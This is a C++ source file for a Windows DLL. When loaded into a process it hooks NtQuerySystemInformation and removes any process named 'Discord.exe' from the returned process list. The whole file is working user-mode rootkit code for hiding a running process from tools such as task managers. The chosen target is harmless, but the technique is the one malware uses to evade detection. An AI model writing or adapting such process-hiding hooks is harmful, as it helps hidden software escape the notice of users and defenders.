// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <winternl.h>
#include "winNt.h"
#include "hooker.h"

GetProcessIdFunc OriginalGetProcessId;
NtQuerySystemInformationFunc OriginalNtQuerySystemInformation;
UNICODE_STRING hiddenImageName;
Hook ntQuerySystemInformationHook;

DWORD WINAPI GetProcessIdHook(_In_ HANDLE Process) {
    auto actualPid = OriginalGetProcessId(Process);
    return actualPid;
}

__kernel_entry NTSTATUS
NTAPI
NtQuerySystemInformationHook(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
) {
    ntQuerySystemInformationHook.revert();
    auto retval = _NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    ntQuerySystemInformationHook.apply();
    if (SystemInformationClass != SystemProcessInformation)
        return retval;
    auto processInfo = static_cast<SYSTEM_PROCESS_INFORMATION*>(SystemInformation), prevGoodProcessInfo = processInfo;

    while (TRUE) {
        if (0 == _RtlCompareUnicodeString(&processInfo->ImageName, &hiddenImageName, FALSE))
            prevGoodProcessInfo->NextEntryOffset += processInfo->NextEntryOffset;
        else
            prevGoodProcessInfo = processInfo;

        if (0 == processInfo->NextEntryOffset)
            break;

        processInfo = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(reinterpret_cast<char*>(processInfo) + processInfo->NextEntryOffset);
    }
    return retval;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     ) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            _RtlInitUnicodeString(&hiddenImageName, L"Discord.exe");
            ntQuerySystemInformationHook = Hook((void*)_NtQuerySystemInformation, (void*)NtQuerySystemInformationHook);
            ntQuerySystemInformationHook.apply();
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            ntQuerySystemInformationHook.revert();
            break;
    }
    return TRUE;
}

